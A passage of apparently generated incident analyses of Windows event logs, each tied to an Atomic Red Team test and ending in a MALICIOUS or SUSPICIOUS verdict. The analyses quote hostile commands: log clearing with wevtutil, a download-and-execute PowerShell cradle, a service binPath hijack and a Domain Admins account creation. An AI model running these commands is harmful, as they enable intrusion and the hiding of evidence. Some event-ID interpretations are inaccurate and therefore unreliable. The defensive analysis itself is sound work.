   - The Windows PowerShell logs show usage of PowerShell scripts to manipulate Exchange Online settings, specifically using the `Add-MailboxPermission` cmdlet to give full access to a delegate mailbox. While not inherently malicious, such actions are unusual for regular administrative tasks if not previously authorized. The use of a plain text password to create a secure string and non-obfuscated script implies potential malicious intent or at least negligent scripting practices.

3. **Sysmon Logs and Command Usage:**
   - Sysmon logs show multiple executions of `wevtutil.exe` which were used to clear different logs (Application, System, and Security). This is part of the suspicious behavior aligning with potential log tampering.
   - The execution of utilities like `whoami.exe` and `hostname.exe` suggests potential reconnaissance activity to gather information about user permissions and system identities.
   - The actions are all tied to the user `SERVER002\\admin_test` on high integrity levels, suggesting privileged access potentially being misused.

**Assessment:**
The behavior observed within these logs involves a combination of unauthorized log clearing and potentially suspicious PowerShell and system utility activity, all conducted under a privileged account (`admin_test`). The use of `wevtutil.exe` to clear logs across channels indicates a possible attempt to cover tracks, which is classic behavior of malicious actors trying to erase evidence of unauthorized actions.

**Resolution:**
- **MALICIOUS**: The presence of event log clearing sequences and unapproved administrative actions using PowerShell indicate malicious intent or activity that is unauthorized and harmful to the integrity of the system. Immediate investigation and response are required to confirm and remediate any unauthorized access or actions.

**Guidance:**
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further unauthorized activities.
   - Conduct a forensic analysis to understand the extent of the actions and potentially recover deleted logs.
   - Identify and validate the scope of the access obtained.

2. **Post-Incident Remediation:**
   - Review and enhance security policies, including monitoring and alerts for log clearing and unauthorized script execution.
   - Conduct a review of account privileges and possibly change credentials for `admin_test` if compromise is suspected.
   - Implement stricter audit controls and monitor for similar activities across other systems."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"After detailed analysis of the provided Windows event logs, the following observations have been made:

1. **Sysmon Logs**: The logs indicate repeated uses of the `wevtutil.exe` tool with the ""cl"" (clear) command targeting various logs, such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""Security"", ""System"", and ""Windows PowerShell"". This sequence of log clearing events is a potential indicator of malicious activity, as attackers often clear logs to hide their tracks. The use of ""wevtutil.exe"" is further corroborated by its high integrity level execution, suggesting it was run with elevated privileges.

2. **System Logs**: Entries show logs with Event ID 104 indicating the clearing of logs in the ""System"" and ""Windows PowerShell"" channels by the user ""admin_test"". Log clearing without a legitimate reason is typically suspicious, especially if it coincides with other potentially harmful activity.

3. **Windows PowerShell and Application Logs**: There's an execution of a PowerShell command involving `AtomicRedTeam` artifacts, specifically executing ""CreateProcessWithPipe.exe"" through ""werfault.exe"". ""Atomic Red Team"" is a known suite of adversarial simulations and tests, which although sometimes used for defensive training, can also be indicators of penetration testing or malicious exploitation if not authorized.

4. **Security Logs**: Contains Event ID 1102 entries that log the clearing of the security logs by the user ""admin_test"". As with the sysmon logs, this is suspicious and often indicative of an attempt to cover tracks.

5. **Anomalies in Time**: The kernel and security logs indicate time changes, where the system time was set back. This can disrupt logs and is another potential sign of malicious intent, possibly employed to confuse timeline analysis.

**Assessment**:
The observed activities, especially the clearing of event logs, use of PowerShell for possibly malicious tasks, and the backdating of system time, strongly suggest that the system has potentially been compromised. These activities align with common attack techniques aimed at evading detection and maintaining persistence.

**Resolution**: **MALICIOUS**

**Guidance**:
1. **Immediate Incident Response**: Initiate a full incident response process, including isolating Server002 from the network to prevent further potential damage or data exfiltration.
2. **Audit and Review Permissions**: Assess and tighten permissions, especially for the ""admin_test"" user and others with elevated privileges.
3. **Log and Monitoring**: Increase log monitoring and set up alerts for similar activities, particularly around log-clearing events and abnormal PowerShell usage.
4. **Security Training**: Conduct training for IT staff on recognizing and preventing such activities.
5. **Forensic Analysis**: Perform a comprehensive forensic review of the host and its network communications to understand the full scope of the compromise."
Service Installation CMD,"### Analysis of Windows Event Logs:

After thoroughly analyzing the provided logs, here are the notable activities and assessment of potential threats:

#### 1. Use of PowerShell and Command-Line Tools:
- The logs indicate the execution of `powershell.exe` by the user `SERVER002\admin_test`, a common tool used by attackers to execute malicious scripts and commands remotely.
- The command-line utility `wevtutil.exe` is executed several times to clear logs (System, Windows PowerShell, and Security). This activity can indicate an attempt to cover tracks after actions that could trigger security alerts.

#### 2. Service Creation:
- There is evidence of a service creation (`AtomicTestService_CMD`) using `sc.exe`. The service is pointing to a binary located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1543.003\bin\AtomicService.exe`. The use of the `AppData\Local\Temp` directory is typically unusual for legitimate service binaries and is a common indicator of potential malicious behavior, as attackers often use this directory for storing malicious executables.
  
#### 3. Log Cleared Events:
- The event logs for Security, System, and Windows PowerShell channels were cleared by the user `admin_test`. It is unusual for event logs to be cleared without legitimate administrative maintenance, indicating potential malicious activity to hide traces.

#### 4. Edge Update and Execution:
- The logs also show a sequence of events involving the Microsoft Edge Update service. While this can be a legitimate activity, attackers sometimes exploit software update mechanisms for persistence or privilege escalation.

#### 5. Use of Sysmon Log Event ID 1 (Process Creation):
- The execution of processes like `wevtutil.exe`, `whoami.exe`, and other system utilities in rapid succession suggests automated or scripted actions, indicative of potentially unauthorized access or system enumeration.

### Threat/Risk Analysis:
The combination of these indicators strongly suggests malicious activity:
- **Clearing of key event logs** strongly argues for malicious intent, typically used to obscure evidence of intrusion or manipulation.
- **Service creation in a non-standard directory** highlights the potential for unauthorized persistence mechanisms that exploit Windows services.
- **The consistent use of PowerShell and command-line utilities** aligns with known tactics, techniques, and procedures (TTPs) in cyberattacks.

### Guidance on How to Proceed:
1. **Isolate the system** immediately to prevent further compromise or data exfiltration.
2. **Conduct a forensic investigation** to identify any additional compromised systems or entry points.
3. **Verify the binaries** located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1543.003\bin\` for malware.
4. **Review access logs and network traffic** around the time of these events to identify potential external connections or lateral movement.
5. **Restore system logs** from backups to re-establish potential evidence and continue monitoring.
6. **Change credentials** for affected user and administrator accounts to prevent unauthorized access using existing credentials.

### Resolution:
- **MALICIOUS**: The logs indicate activity consistent with known malicious behavior patterns, such as the deliberate clearing of logs, service creation pointing to ephemeral directories, and usage of PowerShell and other command-line utilities for potential unauthorized actions. Immediate action is required to contain and mitigate the threat."
Process Hollowing using PowerShell,"Analyzing the provided event logs, there are several indicators pointing toward potentially malicious activity:

1. **Log Cleared Events**:
   - Security logs (EventID: 1102) and system logs (EventID: 104) have been cleared using the `wevtutil.exe` command. This is a commonly seen behavior following malicious activities to cover tracks.

2. **Unusual Privilege Activity**:
   - EventID 4672 shows the user `admin_test` was granted special privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges are significant and sensitive as they allow debugging and managing other processes, which could be exploited by attackers for privilege escalation and system manipulation.

3. **Suspicious PowerShell Activity**:
   - A PowerShell script is executed from a temporary directory with command-line details involving process hollowing techniques as seen in EventID 17964 and others. The script `Start-Hollow.ps1` indicates the use of process hollowing, a technique often used in malware to inject malicious code into a legitimate process, masking their presence.

4. **Session and Process Behavior**:
   - Multiple legitimate system commands have been executed (`wevtutil.exe`, `hostname.exe`, `whoami.exe`), but in combination with logs being cleared, it shows attempts at reconnaissance or execution of cleanup commands after potentially malicious tasks.

5. **Network and IP Address Activity**:
   - There are logon events associated with NTLM authentication from an IP (`fe80::e3b5:5371:12a8:9c77`) that might need further investigation to reveal if they are legitimate accesses.

Given the above observations, the logs point to suspicious behavior requiring further investigation. The combination of log clearing activities, anomalous commands, and administrative privileges utilization warrants concern.

**Resolution**: **MALICIOUS**

**Guidance**:
- Investigate the origins and contents of the `Start-Hollow.ps1` script.
- Conduct a forensic analysis on `Server002` to determine if there were any unauthorized modifications or installations.
- Review changes made using elevated privileges to ensure no backdoors were installed.
- Consider isolating the affected server and reviewing access logs and network traffic around the time of the events.
- Enhance monitoring and alerting on similar activities to detect future occurrences quickly."
Remote Process Injection with Go using RtlCreateUserThread WinAPI,"After thoroughly analyzing the provided Windows event logs, here's a detailed assessment of the situation:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearing**:
   - Multiple logs indicate that a user named ""admin_test"" cleared event logs, specifically the System, Windows PowerShell, and Security logs. These actions are logged at `EventID 104` and `EventID 1102` for System and Security logs, respectively.
   - The clearing of logs is highly suspicious behavior as it is often used by attackers to cover tracks after malicious activities.

2. **PowerShell Activity**:
   - There are PowerShell logs where the command executed includes `Start-Process C:\Windows\System32\werfault.exe` followed by a debug command executed from `RtlCreateUserThread.exe` located in a user’s temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055\bin\x64\`).
   - The use of `werfault.exe` combined with `RtlCreateUserThread.exe` suggests an attempt at process injection or privilege escalation, possibly indicative of an attack.

3. **Event Log Utility (wevtutil.exe) Execution**:
   - There are several Sysmon entries where `wevtutil.exe` was executed multiple times to clear specific event logs like System, Application, and Security.
   - The patterns of clearing logs repeatedly with `wevtutil.exe` by the same user `admin_test` suggest an effort to tamper or remove records of activity.

4. **System Time Change**:
   - Logs show changes in system time, indicating potential tampering with timestamps which typically is done to confuse forensic analysis.

5. **Unauthorized Processes**:
   - Executing non-standard commands such as `whoami` can be part of information gathering post-compromise.

### Malicious Activity:

Given the nature of the activities described above, especially the combination of log clearing by an admin, suspicious PowerShell activities with known methods used in the MITRE ATT&CK techniques (such as T1055 - Process Injection), and patterns of behavior aligning with typical attacker methodologies:

- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed:

1. **Isolate Affected Systems**:
   - Immediately isolate the affected systems (Server002 in this case) from the network to prevent further malicious activities.

2. **Conduct Forensic Analysis**:
   - Perform a detailed forensic analysis on the compromised system to identify the method of initial access, extract any malware/hacker tools, and gather additional evidence of lateral movement.

3. **Review Access and Credentials**:
   - Review and possibly reset credentials for any administrative users, especially focusing on `admin_test`. Ensure multi-factor authentication is enforced.

4. **Check for Persistence Mechanisms**:
   - Investigate for any persistence mechanisms that could allow attackers to regain access.

5. **Strengthen Monitoring**:
   - Increase event log monitoring and implement stricter security policies to prevent actions such as event log clearing and suspicious PowerShell scripting.

6. **Engage Incident Response Team**:
   - Engage your internal or third-party incident response team to assist with containment and eradication efforts.

These logs clearly show steps taken using specific tools and techniques that align with attack patterns, underscoring the malicious intent."
Portable Executable Injection,"### Detailed Analysis of Logs

Upon reviewing the provided logs, several indicators suggest suspicious and potentially malicious activity on the host `Server002`. Here's a breakdown of observations from various log entries:

1. **Log File Clearance (Security and System Logs):**
   - **Event ID 1102 (Security)** and **Event ID 104 (System & PowerShell)** indicate the clearing of log files. These events logged under `admin_test` user show logs were cleared without leaving any backup. Such activity is often associated with malicious actors trying to cover their tracks.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs show the execution of a script that initiates a process (`RedInjection.exe`) that appears to be related to a known adversary emulation tool, Atomic Red Team, specifically [T1055.002 - Process Injection](https://attack.mitre.org/techniques/T1055/002/). This script also attempts to terminate any running `Notepad` processes, indicating potentially harmful intent.

3. **Elevation of Privileges:**
   - The **Security Logs (Event ID 4672)** indicate that the `admin_test` user was granted privileges often associated with administrative levels, such as `SeDebugPrivilege` and `SeImpersonatePrivilege`. These privileges could facilitate unauthorized access or tampering at the system level.

4. **Unusual Process Creation (Sysmon Logs):**
   - The Sysmon logs trace the execution of processes like `wevtutil.exe` (used for clearing event logs), `powershell.exe` executing commands with arguments indicating elevated use, and `RedInjection.exe`, which aligns with malicious behavior for testing or actual attack simulations.

5. **Execution from Suspicious Paths:**
   - The execution of `RedInjection.exe` from a temporary directory path (Typical for temporary files and often used by malware) further raises suspicion.

### Assessment and Recommendation

The analysis of the logs reveals multiple indicators of compromise, including log file clearing, suspicious script execution involving a known attack simulation tool, the potential privilege escalation, and atypical process execution indicative of possible tooling or active intrusion techniques being mapped or executed.

### Resolution

**Overall Resolution: MALICIOUS**

Given the activities outlined, the logs indicate behavior consistent with malicious activity or advanced security testing without the appropriate context or permission. Immediate action should be taken to:

- **Conduct a full forensic investigation** to determine the intent and scope of these actions.
- **Isolate the affected system** to prevent potential lateral movement.
- **Conduct a thorough evaluation of system integrity** to ensure no backdoors or persistent threats remain.
- **Review and reinforce audit logging policies** to better capture and alert on such activities real-time.

It is crucial to identify if the observed behavior was sanctioned (e.g., red teaming exercise) or an unauthorized episode. Immediate coordination with IT and relevant personnel is advised to verify if this operation was intentional and authorized."
Domain Account and Group Manipulate,"### Summary of Analysis:

Upon analysis of the provided Windows event logs, there are numerous relevant events related to process execution, particularly through Windows PowerShell and Sysmon event logs. The following points highlight the important observations and determine the resolution for this case:

#### Suspicious Observations:

1. **PowerShell Execution:** 
   - **Event ID 600 (PowerShell Log):** This event signifies the execution of a PowerShell script aimed at creating a new Active Directory user and adding it to the ""Domain Admins"" group. The script uses PowerShell cmdlets with random number generations (`Get-Random`) to construct the account name. The command as seen in the logs is intended to create a deactivated user in the ""Domain Admins"" group: 
     ```powershell
     $x = Get-Random -Minimum 2 -Maximum 99;
     ...
     New-ADUser -Name $account -GivenName ""Test"" ...;
     Add-ADGroupMember ""Domain Admins"" $account;
     ```

2. **Wevtutil Use for Event Log Clearing:**
   - **Sysmon Event ID 1 and 5:** The `wevtutil` command is used to clear multiple event logs (`Sysmon`, `Application`, `Security`, and `System`). The command line for this operation is:
     ```shell
     ""C:\\Windows\\system32\\wevtutil.exe"" cl [log name]
     ```
   - This behavior is often seen in attempts to hide malicious activity or cover tracks by a threat actor.

3. **User and Process Activities:**
   - The operations were executed under the user `SERVER002\admin_test`, which appears to be an administrative account, indicating potential insider threats or compromised credentials.
   - The suspicious activities align with process creations through `wsmprovhost.exe`, which embeds the `wevtutil` execution.

4. **Clearing of Event Logs:**
   - **System and Security Log Clearing (Event ID 104 & 1102):** The clearing of logs without clear legitimate necessity is a major red flag and a hallmark of post-exploit cleanup.
  
5. **Privileges Assigned to SYSTEM:**
   - Several 4624 and 4672 events show the SYSTEM account being granted a wide range of privileges. These privileges are being leveraged potentially in running processes and escalating actions.


### Threat Assessment:

- **Indicators of Compromise:** The observed PowerShell script execution to alter Active Directory settings combined with log file clearing is a classic sign of potential compromise. The addition to ""Domain Admins"" is particularly concerning as it provides extensive control over the domain environment.
- **Privilege Escalation & Persistence:** Adding a user to the ""Domain Admins"" group, even with `Enabled:$False`, may be established for later exploitation when needed.
- **Evident Log Tampering:** The systematic clearing of event logs signifies an effort to avoid detection or forensic investigation.

### Resolution:

Given the detailed analysis and the observed malicious behavior patterns:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Disconnect the affected host (Server002) from the network to isolate and prevent potential spread or further damage.
   - Change all administrative credentials and monitor for any newly created or altered users across the domain.
   
2. **Investigative Actions:**
   - Conduct a comprehensive forensic analysis on the server to uncover potential latent threats or additional payloads.
   - Verify the permissions changes and user creations across Active Directory.

3. **Remediation:**
   - Ensure all systems have updated security patches and enforced security policies.
   - Apply stricter logging and monitoring of administrative activities and process executions.

4. **Recovery and Continuous Monitoring:**
   - Restore any affected systems to a known good state from backups prior to this incident.
   - Implement continuous security monitoring with an emphasis on unusual account activities and process executions.

   - Document all findings in a detailed incident report.
   - Conduct a post-incident review to learn from this event and improve security posture and incident response processes. 

This analysis must promptly be followed through to prevent any potential exploitations or further damage within the network."
UUID custom process Injection,"Based on the provided event logs from the Windows PowerShell, System, Sysmon, Security, and Application logs, a detailed analysis has been conducted to uncover any suspicious or malicious activities.

**Key Findings:**

1. **PowerShell Execution:**
   - Multiple PowerShell logs show identical commands executing a suspicious binary (`uuid_injection.exe`) from a path in the `Temp` directory which is often associated with malicious activities. The script also includes stopping the Notepad process, which could signify process hollowing or manipulation.
   - The activities involve methodologically executed PowerShell commands that match known attack frameworks such as Atomic Red Team, aimed at mimicking attack techniques for testing purposes.

2. **Log Clearing Activities:**
   - There is evidence of logs being cleared in the System and PowerShell channels, as shown both in the Sysmon and System event logs. The responsible process for this log manipulation is `wevtutil.exe`, executed by the user `admin_test`, indicating an attempt to cover tracks, a behavior often associated with malicious activity.

3. **Executing External Binaries:**
   - The execution of `uuid_injection.exe`, a binary with characteristics matching malicious injection tools, and its association with PowerShell strongly points to malicious intent.
   
4. **Privileges and Security Events:**
   - Security event logs such as 4624 (privilege assignment) and 4672 (special privileges) denote potentially malicious attempts to obtain elevated permissions.

5. **Additional Events & Processes:**
   - Numerous normal system processes and activities such as Windows Defender logs suggest usual system operations; however, the timing and coordination of suspicious PowerShell scripts and log clearing activities take precedence over benign logs.

**Assessment:**

- The activities demonstrated in the logs exhibit clear indicators of compromise and malicious behavior characterized by:
  - Execution and operation of potentially harmful binaries (`uuid_injection.exe`).
  - PowerShell scripts that mirror known testing frameworks (potentially weaponized).
  - Systematic log deletion attempts to hinder forensic analysis.

**Resolution: MALICIOUS**

**Recommendations and Next Steps:**

- Immediate containment of the affected machine to prevent further spread or impact.
- Review and isolate the user account `admin_test` involved in log clearance and suspicious activities.
- Coordinate with IT and incident response teams to execute a full-scale investigation to identify the intrusion source.
- Apply security patches and updates to remediate potential vulnerabilities.
- Conduct employee security awareness training to mitigate risks of similar future incidents.
- Improve logging and monitoring to detect such activities promptly."
Azure AD - adding service principal to Azure AD role,"After thoroughly analyzing the provided logs, several activities can be noted as potentially suspicious or indicative of an anomaly.

1. **Repeated Log Clearing:**
   - In the System log, there are events indicating that the logs for the ""System"" and ""Windows PowerShell"" channels were cleared by the user ""admin_test"" (Event ID: 104). Similarly, in the Security log, Event ID: 1102 indicates that the security log was cleared.
   - Clearing of logs can be a key indicator of malicious behavior, as attackers often clear logs to cover their tracks.

2. **PowerShell Activity:**
   - In the Sysmon and Windows PowerShell logs, there is evidence of PowerShell activity using a script to connect to AzureAD and manipulate roles (by adding a Service Principal to a Global Reader Directory Role). Such scripts can sometimes be leveraged for unauthorized privilege escalation or lateral movement within a network.
   - This PowerShell script execution, initiated by the user ""admin_test"", does not indicate typical usage given the context provided in the logs. The use of an obfuscated password (""p4sswd"") highlights the possibility of malicious intent.

3. **Usage of Administrative Accounts:**
   - All suspicious activities are being conducted under the account ""admin_test"", which appears to have high integrity levels for operations. This could suggest that sensitive activities or attempted privilege escalation/bypasses could be taking place.

Given these observations, it is challenging to affirm with absolute certainty that the activities are malicious without additional context or evidence. However, due to the log clearing events and unusual PowerShell script running under an administrative account, there is significant circumstantial evidence to warrant further investigation.

**Resolution: SUSPICIOUS**

**Recommendations:**
- Conduct an immediate comprehensive investigation to verify the legitimacy of the 'admin_test' user’s activities.
- Review any associated task or job logs for the use of PowerShell and admin_test account to identify any unauthorized tasks or scripts.
- Verify the necessity and security implications of AzureAD scripts used in the environment.
- Perform additional network traffic analysis during the time of the event to look for any unauthorized data exfiltration or external connections.
- Strengthen monitoring and logging configurations to prevent the future occurrence of stealth activities, such as clearing log events."
Domain Password Policy Check: Only Two Character Classes,"Upon examining the provided logs, I have identified specific activities and events that warrant further scrutiny, particularly around the potential for malicious activity involving PowerShell and user account manipulation. Here is a detailed analysis of the logs, focusing on the most critical areas:

### Key Findings:

1. **PowerShell Activity:**
   - There is repetitive execution of a PowerShell script attempting to change user passwords. The script appears to perform operations involving:
     - Reading user credentials from a file located at `%LOCALAPPDATA%\AtomicRedTeam\%USERNAME%.txt`.
     - Using these credentials to set new passwords for the user accounts.
     - The script exits with error handling if the password update fails, indicating potential attempts to brute-force or manipulate account passwords.
   - This sequence of operations is characteristic of the Atomic Red Team suite, often used for simulating adversarial tactics, techniques, and procedures for security testing. However, if this activity was not sanctioned as part of a legitimate security assessment, it could indicate unauthorized password manipulation attempts.

2. **Log Clearing:**
   - Several event logs have been cleared, as evidenced by the repeated execution of `wevtutil.exe` to clear logs (System, Application, Security, and Windows PowerShell). Log clearing is often a tactic used by malicious actors to hide traces of malicious activities.

3. **Security Log Events:**
   - Event 1102 indicates that the security log was cleared by the user ""admin_test"". This event is concerning because log clearing can be used to cover unauthorized actions.
   - Numerous ""4798"" events indicate enumeration of local admin accounts which, in conjunction with the password scripts, suggest possible user account reconnaissance.

4. **Elevated Privileges and Privileged Operations:**
   - Multiple EventID 4672 logs indicate the assignment of significant privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, consistent with privilege escalation tactics.

### Assessment and Conclusion:

Given the analysis of these logs, the activity appears **SUSPICIOUS**. While the presence of Atomic Red Team PowerShell scripts could point to intentional security testing, the unauthorized nature of log clearing, account enumeration, and potential privilege escalations raise red flags. There is lacking clarity about whether this is sanctioned test activity or unauthorized access.

### Recommended Actions:

1. **Verification of Legitimate Tests:**
   - Confirm with IT and Security Teams whether the PowerShell execution related to password manipulation was a part of authorized security assessments.
   
2. **User Account Review:**
   - Conduct a detailed review of the account activities associated with ""admin_test"" and other related accounts to assess for unauthorized access or changes.

3. **Log Management:**
   - Investigate the context and reasoning for log clearance events. Ensure central log servers are gathering logs to prevent data loss or tampering at endpoints.

4. **Threat Hunting:**
   - Initiate a detailed threat hunting exercise to verify that no unauthorized access or malicious activity took place beyond the detected events.

5. **Immediate Mitigation:**
   - If any activities are identified as unauthorized, consider isolating affected systems and resetting potentially compromised accounts.

The activities, although possibly benign if part of a test, cannot be conclusively determined as such without further investigation, hence the categorization as **SUSPICIOUS**."
PowerShell Registry RunOnce,"### Detailed Analysis:

1. **Log Clearance:**
   - **Security Log Event ID 1102:** Indicates that the audit logs were cleared by the user *admin_test* on server *Server002*. Clearing audit logs is often performed by attackers to cover their tracks. This is a strong indicator of suspicious activity.
   - **System Log Event ID 104:** There are multiple logs indicating event log clearance for ""System"" and ""Windows PowerShell"" channels. These actions coincide with the timestamps of the operations performed by *admin_test*. Concurrent log clearance actions across different log types further raise suspicion.

2. **Privilege Elevation:**
   - **Security Log Event ID 4672:** Shows that the user *admin_test* was granted potentially dangerous privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and several others. These can be used for privilege escalation or system tampering, typically linked to malicious intents.

3. **Suspicious Service Management:**
   - Multiple `wevtutil.exe` CLI commands are being used to clear logs (e.g., the ""Security"" log, as indicated in Sysmon EventID 1 entries). While `wevtutil` is a legitimate tool, frequent and automated use of it for clearing logs is uncommon in normal operations and suggests attempts to remove traces of activities.

4. **Anomalous Script Execution:**
   - **Sysmon EventID 1 for powershell.exe:** The command executed involves downloading and executing a script directly from an external source (`https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`). This approach is a typical method used in attacks for executing malware and should be considered highly suspicious.
   - **Windows PowerShell Logs:** The batch script from an online source is executed using PowerShell. The inclusion of `IEX (New-Object Net.WebClient).DownloadString` indicates an attempt to directly execute a remotely fetched script, which is a known threat vector.

5. **Typical Software Updates:**
   - The logs contain various entries from Microsoft Edge Update processes. These processes, while legitimate, show PowerShell activities that might be misused or targeted in an adversarial scenario if a similar pattern of anomaly continues with different software.

### Assessment:

After analyzing the logs, the activities displayed throughout indicate attempts to manipulate system logs and execute potentially harmful scripts using PowerShell. The occurrence of these logs under a specific user with admin privileges, combined with the clearing of event logs, are highly indicative of malicious behavior.

### Resolution: MALICIOUS

### Guidance:
- Immediately isolate the affected system to prevent potential spread or further unauthorized actions.
- Conduct a comprehensive forensic analysis to determine the extent of the compromise and identify the entry point.
- Review and enhance security monitoring to detect similar indicators in the future.
- Scan the network and associated systems for anomalies indicative of lateral movement.
- Reset all credentials on affected systems and beyond, as a precaution."
Modify BootExecute Value,"### Detailed Analysis of Logs

#### Summary
The logs provided have revealed a combination of suspicious activity surrounding the use of administrative commands, particularly related to attempts to clear event logs, manipulation of registry settings associated with the boot configuration, and repeated execution of potentially sensitive PowerShell commands. Additionally, there is evidence of time synchronization activity.

#### Suspicious and Anomalous Behavior

1. **PowerShell Execution**:
   - The logs indicate the execution of PowerShell commands that involve checking for the existence of a registry export file and modifying boot execute settings. The specific command suggests an effort to back up the registry and alter boot execute settings, which can be indicative of persistence techniques.
   - The use of `Set-ItemProperty` to modify the ""BootExecute"" registry property could imply an attempt to manipulate system behavior at startup, a common persistence technique.

2. **Log File Clearance**:
   - Sysmon logs show several instances of log file clearance using `wevtutil.exe`, a known technique to cover tracks by erasing evidence from event logs.
   - Logs from the Security and System channels have been cleared, which is a significant red flag for potential malicious activity as attackers often clear logs to hide their actions.

3. **Registry Manipulation**:
   - The execution of `reg.exe export` command is linked with backing up registry settings, which may be done as part of legitimate backup procedures, but in the context, it appears aligned with the goal to modify and potentially misuse registry settings.
   - The referenced path `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1547.001\src\` aligns with Atomic Red Team tactics, techniques, and procedures (TTPs) indicating testing or simulation of adversarial behavior.

4. **Time Change Events**:
   - Events related to the synchronization of time indicate that the time was altered slightly. While this can be legitimate, it warrants attention in the context of other potentially malicious activities to tamper with timestamps.

5. **Sysmon Events**:
   - Numerous events record the execution of potentially benign applications like `whoami.exe` and `hostname.exe` which are commonly used for privilege reconnaissance.
   - Use of elevated privileges denoted by ""IntegrityLevel: High"" can be suspicious, especially when coupled with process executions like `wevtutil.exe` for clearing event logs.

#### Assessment of the Situation
Based on the analysis, the activities captured in the logs show clear signs of anomalies and behaviors typically associated with attempts to gain persistence and cover traces of malicious activity. The repeated clearing of event logs, registry manipulation, and execution of PowerShell commands that do not seem aligned with normal administrative tasks are pointing towards potential compromise.

#### Identified Threats and Risks
- **Persistence Techniques**: Attempts to alter system boot execute settings for persistence gain.
- **Covering Tracks**: Clearing of event logs suggests efforts to avoid detection.
- **Unauthorized Registry Access**: Manipulation of windows registry settings for potentially malicious purposes.

#### Guidance on How to Proceed
- Conduct a forensic deep-dive into the affected system, focusing on the timeline of the PowerShell executions, registry changes, and the processes that executed `wevtutil.exe`.
- Review and correlate with any network logs, account activities, and other security controls to confirm and understand the extent of compromise.
- Re-evaluate the security practices surrounding system administration, especially the use of PowerShell and administrator accounts.
- Consider enabling more granular logging and real-time alerting for critical events on monitored hosts to detect similar activities promptly in the future.
- Engage in threat hunting exercises to determine if similar patterns exist elsewhere in the environment.

### Resolution: MALICIOUS
The combination of registry manipulation, clearing of logs, and the context of the executed commands indicates malicious activity with intent to alter system behavior for persistence and evade detection."
Modify Fax service to run PowerShell,"Upon analyzing the provided Windows event logs, several key observations indicate potential suspicious or malicious activities:

1. **Use of `wevtutil.exe` and Event Log Clearing**: 
   - There are multiple instances of the utility `wevtutil.exe` being executed (`EventID: 1` in Sysmon logs), such as:
     - `CommandLine`: `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - `CommandLine`: `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - These instances involve clearing event logs. Event log clearing is indicated by `EventID: 104` in the System log and `EventID: 1102` in the Security log. The user `SERVER002\\admin_test` is recorded as performing these actions. This is typically suspicious since clearing event logs can be an attempt to hide malicious activity.

2. **Command Execution with System Privileges**:
   - The `cmd.exe` process executed with a command to configure and start a service with malicious intent:
     - `CommandLine`: `""cmd.exe"" /c sc config Fax binPath= ""C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\"""" & sc start Fax`
     - This indicates a potential service manipulation technique often seen in persistence methods (related to MITRE ATT&CK technique T1543.003 - Create or Modify System Process: Windows Service).

3. **Suspicious PowerShell Execution**:
   - A PowerShell process runs with content that links to MITRE ATT&CK technique:
     - `CommandLine`: `C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c ""write-host 'T1543.003 Test'""`
   - PowerShell is a powerful tool often used in exploitation scenarios and the mention of a known attack technique identifier (T1543.003) raises further suspicion.

4. **Service Control Failures**:
   - The system log records issues with starting the service (`EventID: 7009` and `7000`). This may indicate potential exploitation attempts.

5. **Time Synchronization Events**:
   - Several time change events (`EventID: 4616`) could suggest an attempt to manipulate time data, although these alone may not indicate malicious activity without supporting suspicious actions.

Based on these findings, the following resolution is advised for the assessment:

### Resolution: SUSPICIOUS

- **The activity of clearing logs**, seemingly unauthorized service configuration, and **the presence of potentially obfuscated PowerShell commands**, all under a high integrity context executed by the admin_test account, indicate suspicious behavior requiring further investigation.
- The repeated clearing of logs and manipulation of a legitimate service suggest this could be part of an attempt to establish persistence or cover tracks.
  
### Guidance:
1. **Immediate Investigation**: Conduct a thorough investigation into the `admin_test` account actions. Verify if the observed execution patterns are typical for this user or if credentials may be compromised.
2. **Malware Analysis**: Analyze the processes and scripts executed for malware or reverse engineer any scripts found in the environment.
3. **System Integrity**: Check the integrity of system binaries and logs, particularly focusing on the cleared logs, to identify what actions were being obfuscated.
4. **Network Activity**: Monitor network traffic from and to the server for potential exfiltration or C2 communication.
5. **Security Patches and Updates**: Verify that all systems are up to date with security patches and configurations to prevent exploitation of known vulnerabilities. 

Further investigation and perhaps external threat intelligence consultation could solidify the context and impact of these actions."
Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),"Upon reviewing the provided Windows event logs, several signs of potentially malicious activity emerged, particularly involving the PowerShell and Sysmon logs.

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution:**
   - The PowerShell logs indicate the execution of a command that launches `werfault.exe` followed by the execution of `CreateRemoteThreadNative.exe`. The `CreateRemoteThreadNative.exe` utility, placed in a path related to Atomic Red Team (a known red-teaming framework), suggests the potential for malicious use, particularly for code injection or execution of arbitrary code within another process.
   - The use of PowerShell to execute processes in a context suggesting potentially harmful or unauthorized activities, especially when combined with other utilities like `CreateRemoteThreadNative.exe`, can often imply attempts to bypass security or execute unauthorized code.

2. **Event Log Clearing:**
   - The System log and Sysmon records indicate commands executed using `wevtutil.exe` to clear logs, both in the System and Windows PowerShell channels. This behavior is typically associated with attempts to cover up malicious activities and can be indicative of a post-exploitation scenario where an attacker is trying to remove evidence of their actions.

3. **Privileges Granted:**
